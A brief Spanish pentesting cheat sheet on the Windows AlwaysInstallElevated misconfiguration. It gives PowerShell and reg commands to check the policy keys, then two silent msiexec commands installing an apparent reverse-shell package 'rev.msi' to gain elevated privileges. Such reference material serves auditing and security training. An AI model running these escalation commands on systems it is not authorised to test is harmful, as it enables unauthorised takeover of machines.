Always Install Elevated

En Windows existe una directiva que indica que los paquetes de Microsoft con extensión .msi siempre se instalarán con los máximos privilegios

Para que AlwaysInstallElevated sea explotable normalmente deben estar activadas las claves de usuario y máquina (HKCU y HKLM). Si solo una está a 1, no asumir explotación directa.

PowerShell: Comprobar Vulnerabilidad Always Install Elevated

$hkcu = (Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hklm = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
if($hkcu -eq 1 -and $hklm -eq 1){echo "ES VULNERABLE!"}

CMD: Comprobar Vulnerabilidad Always Install Elevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Es vulnerable si ambas claves están a 1

msiexec /quiet /qn /i rev.msi # Opción 2
msiexec /i c:\users\desktop\rev.msi /quiet /qn /norestart # Opción 3
